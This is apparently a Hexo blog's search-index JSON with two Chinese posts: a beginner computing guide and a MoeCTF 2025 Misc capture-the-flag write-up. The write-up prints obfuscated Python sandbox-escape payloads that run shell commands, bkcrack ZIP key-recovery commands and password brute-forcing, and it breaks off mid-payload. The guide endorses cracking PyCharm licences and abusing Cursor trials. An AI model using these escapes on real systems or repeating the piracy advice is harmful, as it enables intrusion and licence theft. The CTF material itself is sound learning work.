{"meta":{"title":"Sa1ntCHENの小窝","subtitle":"Van!shment Th!s World","description":"","author":"Sa1ntCHEN","url":"https://saintcen.github.io","root":"/"},"pages":[{"title":"About","date":"2025-10-10T13:02:11.114Z","updated":"2025-10-10T13:02:11.114Z","comments":true,"path":"about/index.html","permalink":"https://saintcen.github.io/about/index.html","excerpt":"","text":""},{"title":"Friends","date":"2025-10-16T08:59:18.470Z","updated":"2025-10-16T08:59:18.470Z","comments":true,"path":"friends/index.html","permalink":"https://saintcen.github.io/friends/index.html","excerpt":"","text":"My only~"},{"title":"留言板","date":"2023-12-31T16:00:00.000Z","updated":"2025-10-16T08:56:04.678Z","comments":true,"path":"contact/index.html","permalink":"https://saintcen.github.io/contact/index.html","excerpt":"","text":"欢迎来到留言板！"},{"title":"Categories","date":"2025-09-25T11:33:07.930Z","updated":"2025-09-25T11:33:07.930Z","comments":true,"path":"categories/index.html","permalink":"https://saintcen.github.io/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2025-09-24T13:41:25.356Z","updated":"2025-09-24T13:41:25.356Z","comments":true,"path":"tags/index.html","permalink":"https://saintcen.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"你缺失的那门计算机课","slug":"你缺失的那门计算机课","date":"2025-10-16T16:00:00.000Z","updated":"2025-10-23T03:01:37.740Z","comments":true,"path":"2025/10/17/你缺失的那门计算机课/","permalink":"https://saintcen.github.io/2025/10/17/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/","excerpt":"","text":"你缺失的那门计算机课 Writing For HIC Dev Group 部分说法不够专业或存在错误，欢迎指正 本文和你缺失的那门计算机课 | 计算机技术学习札记目的类似，但针对性和实用性更强，部分已经涉及的内容不再重复。无论是开发还是以后的学习，你都要了解你的伙伴。 命令行 命令行是操作系统（OS，Operation System）中非常重要的组成部分，在不同的OS中命令语法和底层逻辑也各不相同，也有很多变种（如git bash/anaconda prompt）。命令行可以简单地理解为在特定的文件路径下执行不同的指令，便捷地管理文件或执行程序。我们的windows系统本质上是一种GUI（图形化界面），比如，删除文件你依靠显示屏和鼠标即可完成。但是通过命令行，你不仅可以通过一条简单的命令就完成删除操作，还可以使用许多不支持图形化界面的工具。 # 切换路径 更换磁盘（以D盘为例）需要先输入D: cd C:\\Users\\25878\\Desktop\\Repository\\Hexo-Blog # 需要执行命令 npm install -g hexo-cli 这里再补充几点。 1.以管理员模式运行：可以解决部分文件和程序的权限问题，可以解决部分报错。 2.指令的格式： npm install -g hexo-cli ↑ ↑ ↑ ↑ | | | | | | | └─── 参数2 (Argument / Parameter) | | | | | └─── 选项/标志 (Option / Flag) | | | └─── 子命令 (Subcommand) | └─── 命令/程序 (Command / Program) 3.默认快捷键：Win+R启动运行窗口（在Linux系统中是Ctrl+Alt+T），输入cmd/powershell（二者存在语法的区别，但功能类似）。当然，点击任务栏的windows图标搜索也是可以的。 Linux 提到命令行和操作系统就不得不提Linux了。 Linux是一种开源和免费的类Unix操作系统，其内核由芬兰计算机科学家Linus Torvalds于1991年创建。Linux继承了Unix的设计思想，具有多用户、多任务、支持多线程和多CPU等特性。 但是大部分人的电脑上都只安装了windows/mac操作系统，linux这个听上去高大上的概念似乎离大家很遥远。当然，我想你们中有些人或许大学四年都用不着linux，但它对于专业开发者来说非常非常重要。 卓越的开发环境和社区生态：拥有海量的开源库、框架及强大的工具链，社区活跃，问题解决方案丰富，许多项目都是在linux上测试的，绝大多数云服务器也是linux系统，是开发者和企业的首选平台。 丰富的发行版和可定制性：从轻量级到功能全面，从服务器到桌面，提供多种发行版（如Ubuntu、Kali）选择。用户可深度定制每一个环节，打造完全符合个人需求的工作环境。 强大的操作系统内核：以高稳定性、高效能和安全性著称。驱动了全球绝大部分的服务器、超级计算机和安卓设备，是互联网基础设施的基石。 无所不能的命令行：通过shell命令，外加一些下载的工具，可以高效、精准地完成文件管理、系统监控、编程开发等所有任务。其强大的脚本功能还能将复杂操作自动化，极大提升效率。 便捷的环境管理：强大的包管理器（如 apt, yum）提供海量软件的一键安装与依赖管理；结合容器技术（如 Docker），可快速创建、复制一致的隔离环境，从根本上解决开发、测试与部署的环境问题。 至于使用方法，主流的一种是通过VMware Workstation（相对便捷，但是存在硬件不支持的问题，比如无法调用GPU），另一种是下载iso文件安装双系统。具体操作不详细展开，网上教程很多。 但它也没有这么完美，因为比较原生，一些windows上不会出现的bug，linux上会。 软件与工具 下载软件和工具，可以帮我们解决一些任务或者配置环境。比如，做过后端加分题T3的同学应该会用到burpsuite，是一个强大的网络渗透工具，积累一些常见的工具可以让你拥有舒适的使用体验，也可以让黑客在网络上招摇过市。有些工具有GUI（网页或者本地软件），但是有些工具需要命令行，命令行工具的使用要善于搜索与积累。下载途径，可以分为官网/资源上传/github仓库等等。 工具类软件推荐 | 你缺失的那门计算机课 | 计算机技术学习札记 付费与订阅 我可以断言绝大部分工具都有白嫖技巧！ 比如，cursor可以靠反复申请邮箱连续订阅，pycharm可以靠破解许可证激活。 当然，有些该付费的还是要付费，比如一个月50RMB的Trae可以畅享600次的SOTA AI，一个月12RMB的Clash可以畅想高速访问，把钱用在刀刃上。 至于白嫖技巧，CSDN/b站/知乎，甚至微信公众号，完全可以cover。 网络问题 我们不可避免需要访问国外网站（甚至有人和我说导员不让用？），毫无疑问可以用VPN，但是没VPN的要哀嚎，有VPN的嫌每一次打开麻烦。 因此，我们可以使用镜像站！意思就是，通过代理服务器实时从原始网站调取内容并呈现给访客的网站。 直接访问URL 我这里以Hugging Face为例，是一个集成了预训练模型的网站，对于做AI相关的项目或科研非常重要，官方网站是https://huggingface.co/，没VPN上不去，但镜像站可以直接访问https://hf-mirror.com/。类似的还有直接集成高速下载链接，比如：清华大学开源软件镜像站 | Tsinghua Open Source Mirror 配置文件配置镜像源 我这里指的配置文件是一些控制下载资源的包管理器的配置文件，我这里举两个例子。 1.Anaconda可以控制python包的下载，如果使用基础的conda源下载速度比较慢，我们需要配置镜像源。它有一个配置文件.condarc（当然配置远远不止镜像源）。在linux系统中一般在根目录，而且可以用vim工具直接修改，在windows系统中一般在C:/Users/用户名下，直接找到文件修改即可，具体修改内容上网自行搜索，各个包管理器不太相同。 2.npm是未来组会我们制作个人主页需要用到的Node.js包管理器。我们可以通过命令行直接设置镜像源。 # Set Taobao mirror as the npm registry npm config set registry https://registry.npmmirror.com # Verify the configuration npm config get registry # Output: https://registry.npmmirror.com 另一个python下载源pip同理，通过命令行设置它会自动在系统目录下创建/pip/pip.ini配置文件，后续可以通过修改配置文件来控制下载源功能，下面展示了路径和内容的查找方法。 pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple C:\\Users\\25878>pip config list -v For variant 'global', will try loading 'C:\\ProgramData\\pip\\pip.ini' For variant 'user', will try loading 'C:\\Users\\25878\\pip\\pip.ini' For variant 'user', will try loading 'C:\\Users\\25878\\AppData\\Roaming\\pip\\pip.ini' For variant 'site', will try loading 'c:\\users\\25878\\appdata\\local\\programs\\python\\python38\\pip.ini' global.index-url='https://pypi.tuna.tsinghua.edu.cn/simple' C:\\Users\\25878>pip config list global.index-url='https://pypi.tuna.tsinghua.edu.cn/simple' 下载速度太慢 如果下载一些比较大的文件实在等不及，我们可以使用多线程下载工具。 在linux系统中，命令行就有aria2，而windows系统中，我推荐有GUI的Motrix，大家可以自己搜索。 配环境 配环境是非常困扰同学们的一个问题，但我认为这是初学者和进阶者的核心能力区别，一旦你熟练掌握，你可以快速地复现一个项目并且修改代码。但是，应用场景五花八门，没有一个统一的解决方案，我认为配环境技巧就是 根据大佬的帖子一步一步来，注意不要跳步骤 遇到报错善搜索和问AI，对于常用的做笔记 保持一个良好的心态，胸有惊雷而面如平湖 硬件需要驱动的我不太熟，这里就举软件的例子。 首先，我非常推荐大家使用vscode作为首选的开发IDE，虽然配置环境部分对初学者来说比较烦琐，但是一个vscode可以运行所有环境的代码，还有很多开发实用插件和美化插件（比如我就喜欢换好看的背景，coding心情更好）。当然也要看具体的任务和个人喜好，跑AI我喜欢vscode而不是pycharm，开发我喜欢IDEA而不是vscode。 配环境，无非需要涉及到的是集成IDE，编译器，包管理器，框架，插件/工具，命令行等等。为什么Dev-C++可以直接使用？你溯源到它的文件地址，你就能发现它实质上包含编译器文件。所以你在配置vscode的c/c++环境要下载MinGW，并且要通过设置全局系统环境变量来定位他的文件位置。同样的，深度学习环境需要cuda/cudnn，java需要jdk。程序呈现给你的是可读性语言，运行需要编译器连接到底层硬件。 另外，因为不同的任务需要下载不同的包，而不同的包和不同的环境我们需要统一的管理实现环境隔离，这个时候包管理器就出现了。比如，上文提到python有anaconda，java有maven，这些包管理器帮助我们更好的构建开发环境。至于插件/工具/框架等等，我们往往需要通过命令行或者官网下载。 环境也分为本地环境和云环境，云环境我们需要租借云服务器进行运行，网站就是在云服务器上运行的。 命令行发挥了重要作用：有些环境激活需要通过命令行，例如实现SSH远程连接；确认环境是否配置可以通过观察命令行的输出。所以，学好使用shell非常重要。 Github 首先要明确，Github是一个国外网站，按刚才说的，我们可以通过vpn/镜像站访问。 常用的镜像站有： https://help.kkgithub.com（通过这个网站跳转） https://bgithub.xyz 如果你还不知道Github是啥，只是听过，那我要告诉你了：GitHub是一个流行的代码托管平台，广泛应用于个人开发者、开源项目和企业级开发团队。它基于Git版本控制系统，允许开发者存储和管理代码，同时跟踪和控制代码的更改。GitHub不仅提供代码托管服务，还集成了项目管理、代码审查和持续集成等功能。此外，GitHub也被称为“程序员的Facebook”，因为它促进了开发者之间的社交和合作。 论文代码/优秀项目都在这里开源，你也可以通过Github构建自己的小天地，没有账号的赶紧注册！ 仓库管理 Github的仓库管理比较不一样，因为涉及到专业的企业开发和隐私政策，网页上可以新建仓库，但是无法直接上传代码，我们需要通过命令行工具git bash或者github desktop（GUI）对代码的版本进行管理。此外，在连接上也有一些小细节，比如采用http传输往往需要连接VPN上传，通过SSH传输可以避免这个问题，感兴趣的可以自行搜索。 仓库的功能有很多，比如release/issue/discussion等等。我要特别提及一下commit，它记录了每一次的代码提交，在团队协作的项目中至关重要。 开源代码 学术论文/开源项目的代码和进度往往会上传平台公开，学会下载开源代码从复现到修改不仅仅是做项目/做科研的基础，也可以找到实用的工具，提升我们的工作效率，或从中学习技术。可以直接从网页中下载，或者用git clone命令。下载完成后，环境配置/操作指南请参考README.md。还有，不会markdown语法的赶紧去学了，做记录/文档非常有用。 浏览器 开发者工具 “网络”可以查看网络请求和加载的页面文件，“元素”可以查看前端的盒子布局和源代码（也可以鼠标右键+查看源代码），“应用程序”可以控制网页的缓存，但我要重点提一下控制台。 鼠标右键+检查，或者F12。控制台可以直接控制网页行为并输出信息。比如在你可以禁用JavaScript上传学在西电不让粘贴的内容，你可以执行JS代码抢远望谷的位置，你可以根据报错码定位自己的网页代码错在哪里…….网页开发离不开浏览器，它不仅是容器，更是重要的测试工具。 浏览器插件 为了更便捷的使用浏览器，或者达成某些功能（比如刷课），浏览器推出了各种插件，感兴趣的同学可以关注下，除了使用也可以也通过JS等语言编写。 SOTA AI 在大见面会上，文少鼓励大家拥抱SOTA AI，简单来说就是目前性能最强的AI。首先要提醒大家，AI的概念不仅局限于大模型（LLM），还涉及一些多模态AI，比如图像生成，图像理解等等，大语言模型的变种是agent，通过调用大语言模型的api，经过微调，外加MCP工具，可以自行实现某些具体领域的功能，比如AI Code Editor。 LLM的使用，可以通过访问镜像站或者境外网站。个人觉得GPT-5/Gemini2.5-Pro深度思考比较强，claude4-sonnet的coding能力突出（速度快，但定位错误和综合思考的能力比前两个差一些），阿里qwen的使用体验也不错。日常任务，deepseek/doubao就够用了。不过我还挺喜欢花里胡哨的豆包的。 然后就是AI Code Editor，在开发领域功能非常强大，从编写，到测试，到部署让你享受强大的模型，自动补全代码，自动执行命令，用过你才知道程序员为什么被取代了。目前比较主流的就是cursor和trae，目前trae赶上的很快，使用上没有太大差异。但是要注意下载海外版，并且挂VPN才能使用。 后续搭建个人网站，可以让不太会写前端代码的也能搭建出精美的网站。 当然我不鼓励大家在编程上太依赖AI，他确实可以帮助我们完成一些繁琐的工作，但正如“确认是否修改”功能一样，需要人的审查。在一些复杂的任务中，AI很容易出错，哪怕是简单的任务也容易不符合我们的预期。我们在给他指令的时候需要把设计工作做详细，或者在他的提示下，发挥主观能动性，共同完成剩余部分。 至于不同任务下prompt如何设计，感兴趣的同学可以去搜搜，实践也会给你提供经验。 补充 在后端开发招新的学习路线中，我希望大家可以去学习操作系统/计算机网络的基础知识，一些常见的问题，比如你对校园网的疑惑，都可以解决。这里推荐一些技术人的茶歇吧，可以多积累计算机相关的知识和前沿方向。 知乎/菜鸟教程/稀土掘金/Github Trending/InfoQ","categories":[{"name":"教程","slug":"教程","permalink":"https://saintcen.github.io/categories/%E6%95%99%E7%A8%8B/"}],"tags":[{"name":"CS基础","slug":"CS基础","permalink":"https://saintcen.github.io/tags/CS%E5%9F%BA%E7%A1%80/"}]},{"title":"MoeCTF2025_Misc_wp","slug":"MoeCTF2025_Misc_wp","date":"2025-10-12T16:00:00.000Z","updated":"2025-10-15T16:28:03.142Z","comments":true,"path":"2025/10/13/MoeCTF2025_Misc_wp/","permalink":"https://saintcen.github.io/2025/10/13/MoeCTF2025_Misc_wp/","excerpt":"","text":"MoeCTF2025_Misc_wp 工具大赛罢了 环境配置 操作系统：Windows 11/Ubuntu 22.04 LTS 代码环境：python 乱七八糟的工具，写一题找一个 Misc入门指北 欢迎来到misc的世界^ _ ^ 打开PDF，查找moectf，复制隐藏的flag提交即可（注意拉到底）。 moectf&#123;We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!&#125; Rush “冲刺，冲刺！”你正走在路上，耳边传来这样的声音，还没反应过来，就被撞倒了。 你费劲地爬起来，好像看到了什么信息，回过神来那人早已扬长而去，那我缺的这个道歉这块？ 拿到gif发现二维码，截图。 用CQR打开直接发现了隐藏flag。 moectf&#123;QR_C0d3s_feATUR3_eRror_c0RRECt10N&#125; ez_LSB 这是一张普通的图片，但是一个个像素看过去似乎有些蹊跷？ 题目已经告诉我们是图片LSB隐写，我们用zsteg检测下，但flag形式没有意义。 dzc@dzc-virtual-machine:~/zsteg$ zsteg xidian.png b1,r,lsb,xy .. text: \"The flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9\" b1,rgb,lsb,xy .. file: TeX font metric data (\\002H \\002) b1,rgba,msb,xy .. file: OpenPGP Public Key b2,bgr,msb,xy .. file: Applesoft BASIC program data, first line number 128 b3,bgr,msb,xy .. file: Lotus unknown worksheet or configuration, revision 0x8 b4,r,lsb,xy .. file: Targa image data - Map (256-4112) 4096 x 65536 x 1 +4097 +257 - right \"\\001\\020\\001\\020\\021\" b4,bgr,lsb,xy .. file: Targa image data - Map 65536 x 1 x 16 +1 我们用cyberchef尝试base64解码得到flag。 moectf&#123;LSB_1s_s0_1nt3rest1ng!!sj9wd&#125; ez_锟斤拷???? E=hv在记事本里写下了一些神秘字符， 但是经过一通保存另存为的迷之操作之后文本文件里的东西全变成了乱码 拿到了flag.txt文件，UTF-8错误由GBK解码所致，需要对此乱码（锟斤拷）进行处理。 garbled_text = \"锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹\" # 1.用 GBK 编码 gbk_bytes = garbled_text.encode('gbk', errors='replace') # 替换无法编码的字符 # 2.用 UTF-8 解码 original_text = gbk_bytes.decode('utf-8', errors='ignore') # 3.转成半角 import unicodedata def full_to_half(text): return ''.join( unicodedata.normalize('NFKC', char) # NFKC 标准化转换全角→半角 for char in text ) flag = full_to_half(original_text) print(flag) 得到了输出 moectf&#123;EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww&#125;恭喜你得到弗拉格后面全?斤拷锟斤拷锟斤拷 不知道何意味。取前面的flag部分提交即可。 weird_photo FLAG就在图中。什么，你说你看不见 FLAG？注意 CRC！ 提示图片的CRC校验值可能有误，我们用pngcheck检查下。 pngcheck -v photo.png File: photo.png (829531 bytes) chunk IHDR at offset 0x0000c, length 13 900 x 490 image, 24-bit RGB, non-interlaced CRC error in chunk IHDR (computed d34d176f, expected b5a7bf8c) ERRORS DETECTED in photo.png 然后根据西电同学的经验，这个塔楼拍的不太完整，感觉是图片尺寸改掉了？我们用010 Editor编辑下。 搜索b5a7bf8c的位置，改成d34d176f（位置就在IHDR块数据开始的地方）。尺寸384和1EA用十六进制计算就是900和490，我们把高度1EA也改成384看看能不能显示flag。 moectf&#123;Image_Height_Restored&#125; SSTV 识别并解码附件中使用的特殊通信协议，以获取隐藏信息。 已经提示了我们SSTV编码，我们使用RX-SSTV工具，配置虚拟声卡，播放sstv.wav即可。 moectf&#123;d3codiNG_SStV-reQu1REs-PATI3nC3&#125; encrypted_pdf I am so forgetful… So I will use a password that is simple enough. 加密的PDF，密码足够简单，爆破即可，我用的是在线网站I Love PDF。 解密后打开PDF，隐藏方式和入门指北一样，查找moectf。 moectf&#123;Pdf_1s_r3a1ly_c0lor4ul!!ihdw&#125; 啊啊啊啊啊啊啊啊啊啊啊SEC娘宝宝可爱捏~ 捂住一只耳 一只手捂住耳朵 另一只手打开音乐 似乎听到了不一样的声音 明显在暗示单声道与立体声，我们用Audacity工具观察并且分离出上方的声道。 像是有规律的声音，听了一下好像是moise密码，我们用在线网站解码一下就得到flag。 moectf&#123;HALF_RADIO_IN_XDU&#125; 我已经很久没有听到过半部电台的故事了… Enchantment 哇多么好的附魔啊 你把图片发了出去，但似乎附魔台上的文字有一些不对劲？ 得到了一个pngpca文件，我们用wireshark作流量分析。 用http过滤，发现了post方法上传的enchantment.png文件，我们导出分组字节流保存文件为png格式。 这是minecraft里的附魔台文字，我们去网上找一下换算图，一个个对过来就得到flag。 moectf&#123;now_you_have_mastered_enchanting&#125; WebRepo 这都是什么稀奇古怪的格式！？ 直译一下是“网络上的仓库”，但是得到了一个webp文件，好一个一语双关。 扫描二维码告诉我们用binwalk，检查了一下发现是.rar文件，解压出发现了隐藏的.git文件夹，和题目对上了，是个仓库（太对了，真是WebRepo），flag一定藏在提交信息中。 在该目录下打开终端输入git show，得到flag。 moectf&#123;B1NwA1K_ANd_g1t_R3seT-MaG1C&#125; ez_ssl zero6six 在网页内上传了一份秘密文件。望着浏览器提示的“连接安全，信息不会外泄”，他觉得万无一失。 但与此同时，他的浏览器却悄悄上传了另一份文件。现在把他电脑的抓包记录给你，你能破解他的秘密吗？ 得到了一个pngpca文件，我们用wireshark工具作流量分析。题目提示有“秘密文件”和“另一份文件”，我们应该要把两个都找到。 http过滤查看post方法上传的文件，发现是ssl.log日志文件；而html文件显示进行了文件上传操作。 查了一下和TLS有关，配置ssl.log文件后发现了http过滤后的信息变多，有一个zip文件，我们把文件导出，发现里面存在flag.txt。 然！后！我就一直以为ssl.log或者其他地方藏了密码，用各种方式去试都不行……最后发现压缩包写了密码是7位纯数字。用工具ARCHPR直接爆破。 得到密码：6921682，解压压缩包得到Ook编码，找个在线网站解码一下得到flag。 moectf&#123;upI0@d-l0G_TO-DeCrYPT_uploAD&#125; ez_png 这张平平无奇的图片里藏着一个小秘密。秘密不在颜色中，而在文件的骨骼里。注意：某些数据段的长短似乎不太协调。 对于图片结构，我们可以使用工具pngcheck。 File: ez_png.png (899069 bytes) chunk IHDR at offset 0x0000c, length 13 900 x 600 image, 24-bit RGB, non-interlaced chunk pHYs at offset 0x00025, length 9: 2835x2835 pixels&#x2F;meter (72 dpi) chunk IDAT at offset 0x0003a, length 65524 zlib: deflated, 32K window, default compression chunk IDAT at offset 0x1003a, length 65524 chunk IDAT at offset 0x2003a, length 65524 chunk IDAT at offset 0x3003a, length 65524 chunk IDAT at offset 0x4003a, length 65524 chunk IDAT at offset 0x5003a, length 65524 chunk IDAT at offset 0x6003a, length 65524 chunk IDAT at offset 0x7003a, length 65524 chunk IDAT at offset 0x8003a, length 65524 chunk IDAT at offset 0x9003a, length 65524 chunk IDAT at offset 0xa003a, length 65524 chunk IDAT at offset 0xb003a, length 65524 chunk IDAT at offset 0xc003a, length 65524 chunk IDAT at offset 0xd003a, length 46973 chunk IDAT at offset 0xdb7c3, length 38 chunk IEND at offset 0xdb7f5, length 0 No errors detected in ez_png.png (18 chunks, 44.5% compression). 发现有数据块不正常，用binwalk检查一下，直接拆出来了zlib文件，点开就得到了flag。 moectf&#123;h1DdEn_P4YlOaD_IN-Id4T&#125; 万里挑一 要想冲破封锁，寻得真谛，须从万把钥匙中找出唯一的答案 递归解压脚本，并把所有密码写入txt（最后手动处理一下多余的提示）。 import zipfile import tempfile import os def extract_zips(zip_path, output_file): with tempfile.TemporaryDirectory() as temp_dir: with zipfile.ZipFile(zip_path, 'r') as zip_ref: zip_ref.extractall(temp_dir) for item in os.listdir(temp_dir): item_path = os.path.join(temp_dir, item) if item.endswith('.txt'): with open(item_path, 'r', encoding='utf-8', errors='ignore') as f: content = f.read().strip() with open(output_file, 'a', encoding='utf-8') as out_f: out_f.write(content + '\\n') elif item.endswith('.zip'): extract_zips(item_path, output_file) def main(): zip_path = \"password.zip\" output_file = \"dic.txt\" extract_zips(zip_path, output_file) if __name__ == \"__main__\": main() 然后用ARCHPR字典爆破，成功解压。 a296a5ec1385f394e8cb 发现明文.exe和flag.txt，联想到bkcrack明文攻击（Bugku CTF：请攻击这个压缩包[WriteUP]-CSDN博客） echo \"4d5a90000300000004000000ffff\" | xxd -r -p > plain.bin bkcrack -C flag.zip -c \"明文.exe\" -p plain.bin # 得到key1 key2 key3 bkcrack -C flag.zip -k eec878a3 6808e48f 3aa41bd8 -U new_flag.zip 123456 # 用新密码解密 moectf&#123;Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad&#125; Encrypted_Volume 找到钥匙，解开加密卷！ 用01editor打开，在最后一个文件块中找到了PNG，保留这一部分发现二维码，扫描找到密钥。 :@(s&lt;&quot;A3F:89x541Ux[&lt; 用veracrypt挂载Volume文件，得到了brainfuck加密文件，解密一下即可。 moectf&#123;nOW_YoU-h4V3_UNlocKED-VOlumE&#125; 哈基米难没露躲 出题人哈基米音乐听多了(bushi 看了半天，符号和词都有规律，100pts不至于自己解吧？我去网上搜了搜哈基米加密，还真有。 简直就是世界上最优美的加密啊。 https://lhlnb.top/hajimi/base64 提示隐写，发现有零宽字符，需要再解密。https://330k.github.io/misc_tools/unicode_steganography.html moectf&#123;1b8956b9-a423-4101-a1bd-65be33682c82&#125; 2048_master 大家都是2048高手吧，出题人准备了一点小礼物哦，玩玩游戏就能拿到flag^ _ ^ 游戏玩了下玩不出来，所以我选择reverse。 思路：找到比较 &gt; 13 的指令并修改成&gt; 1。 cmp eax, 0Dh # 改成01h IDA中的操作是：1.修改：Edit → Patch program → Assemble，2.保存：Edit → Patch program → Apply patches to input file。运行修改后的.exe后就得到了flag。 moectf&#123;Y0u_4re_a_2048_m4st3r!!!!r0erowhu&#125; Pyjail 0 A simple reader (所以严格来说这题不算 Pyjail) 关于验证码，示例：Please enter the reverse of ‘GZUUAOIS’ to continue: SIOAUUZG 至于 flag 的位置？你可以参考 Web 第十二章（ Pyjail沙箱逃逸笔记：https://xz.aliyun.com/news/12093 想起了那个把我恶心坏的web第十二章了，在虚拟环境里。 文件路径：/proc/self/environ。 接下来我都在windows上用netcat连接，格式为netcat localhost &lt;port&gt;。 此题输入反转字符串和文件地址即得到： moectf&#123;07a71386-d189-c798-f194-04229b0b07e7&#125; Pyjail 1 flag 位置在 /tmp 下 def chall(): user_input = input(\"Give me your code: \") # 过滤关键字 forbidden_keywords = ['import', 'eval', 'exec', 'open', 'file'] for keyword in forbidden_keywords: if keyword in user_input: print(f\"Forbidden keyword detected: &#123;keyword&#125;\") return result = eval(user_input) 我们可以用字节数组或字符编码来构造字符串，避免直接写import，想要执行如下代码我们可以改写： getattr(globals()['__builtins__'], '__import__')('os').system('cat /tmp/flag.txt') getattr(globals()['__builtins__'], bytes([95, 95, 105, 109, 112, 111, 114, 116, 95, 95]).decode())('os').system('cat /tmp/flag.txt') moectf&#123;77553abb-2b7a-2c71-1870-4c41d9778a64&#125; Pyjail 2 flag 位置在 /tmp 下 def chall(): user_input = input(\"Give me your code: \") # 过滤关键字 forbidden_keywords = ['import', 'eval', 'exec', 'open', 'file'] for keyword in forbidden_keywords: if keyword in user_input: print(f\"Forbidden keyword detected: &#123;keyword&#125;\") return # 过滤特殊字符 forbidden_chars = ['.', '_', '[', ']', \"'\", '\"'] for char in forbidden_chars: if char in user_input: print(f\"Forbidden character detected: &#123;char&#125;\") return result = eval(user_input) 1. 使用chr()编码绕过字符过滤 所有被禁止的字符（如_）和关键字都用chr(ASCII码)表示。 2. 使用getattr()进行属性访问 由于.被禁止，使用getattr(object, attribute)来访问属性。 3. 使用globals()和__getitem__()访问字典 由于[]被禁止，使用：dict[key] → dict.__getitem__(key) → getattr(dict, '__getitem__')(key)。 __import__(&#39;os&#39;).system(&#39;cat &#x2F;tmp&#x2F;flag.txt&#39;) getattr( getattr( getattr( getattr( globals(), &#39;__getitem__&#39; )(&#39;__builtins__&#39;), &#39;__dict__&#39;, getattr( globals(), &#39;__getitem__&#39; )(&#39;__builtins__&#39;) ), &#39;__getitem__&#39; )(&#39;__import__&#39;)(&#39;os&#39;), &#39;system&#39; )(&#39;cat &#x2F;tmp&#x2F;flag.txt&#39;) getattr(getattr(getattr(getattr(globals(), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)), chr(95)+chr(95)+chr(100)+chr(105)+chr(99)+chr(116)+chr(95)+chr(95), getattr(globals(), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95))), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(111)+chr(115)), chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)) moectf&#123;59042fef-1e84-9185-fcbc-50168d5e02ba&#125; Pyjail 3 flag 位置在 /tmp 下 def chall(): user_input = input(\"Give me your code: \") try: result = eval(user_input, &#123;\"__builtins__\": None&#125;, &#123;&#125;) # Hint: When __builtins__ is None, you need to be more creative... print(\"Code executed successfully!\") if result is not None: print(f\"Return value: &#123;result&#125;\") except Exception as e: print(f\"Execution error: &#123;type(e).__name__&#125;: &#123;e&#125;\") 即使 __builtins__ 被禁用，仍然可以通过对象继承链或现有类的属性来重新获取内置函数。例如： 通过元类（如 ().__class__.__mro__）找到基类（如 object）。 遍历子类（如 __subclasses__()）来寻找可用的类（如 os._wrap_close、ModuleSpec 等）。 通过这些类的 __init__.__globals__ 或 __builtins__ 属性重新获取内置函数。 ([c for c in ().__class__.__mro__[-1].__subclasses__() if c.__name__&#x3D;&#x3D;&#39;ModuleSpec&#39;][0].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;tmp&#x2F;flag.txt&#39;).read()) moectf&#123;6486e9b8-47b8-0b5e-dead-8e554dd2a1b6&#125; Pyjail4 flag 位置在 /tmp 下 import ast import base64 # 自定义 AST 节点访问器来限制可用的语法结构 class RestrictedNodeVisitor(ast.NodeVisitor): forbidden_attrs = &#123; \"__class__\", \"__dict__\", \"__bases__\", \"__mro__\", \"__subclasses__\", \"__globals__\", \"__code__\", \"__closure__\", \"__func__\", \"__self__\", \"__module__\", \"__import__\", \"__builtins__\", \"__base__\", \"__init__\", \"__getattribute__\" &#125; def visit_Attribute(self, node): # 禁止危险属性访问 if isinstance(node.attr, str) and node.attr in self.forbidden_attrs: raise RuntimeError(f\"Access to attribute '&#123;node.attr&#125;' is forbidden!\") self.generic_visit(node) def chall(): user_input = input(\"Give me your code after base64 encoding it: \") code = base64.b64decode(user_input).decode('utf-8') if not user_input: print(\"Empty input!\") return try: # 使用 AST 解析和验证代码 tree = ast.parse(code) visitor = RestrictedNodeVisitor() visitor.visit(tree) # 创建受限的执行环境 safe_builtins = &#123; \"print\": print, \"filter\": filter, \"list\": list, \"len\": len, \"Exception\": Exception &#125; safe_globals = &#123;\"__builtins__\": safe_builtins&#125; # 执行用户代码 exec(code, safe_globals, &#123;&#125;) print(\"Code executed successfully!\") except SyntaxError as e: print(f\"Syntax Error: &#123;e&#125;\") except RuntimeError as e: print(f\"Runtime Error: &#123;e&#125;\") except Exception as e: print(f\"Execution Error: &#123;type(e).__name__&#125;: &#123;e&#125;\") 在Python中，栈帧（Stack Frame）是解释器用于管理函数调用的一种内部数据结构。每当一个函数被调用时，Python就会创建一个栈帧对象，其中包含了该函数执行所需的“上下文”，例如局部变量、传入的参数以及当前指令的位置（返回地址）。 import base64 code = \"\"\" try: raise Exception() except Exception as e: frame = 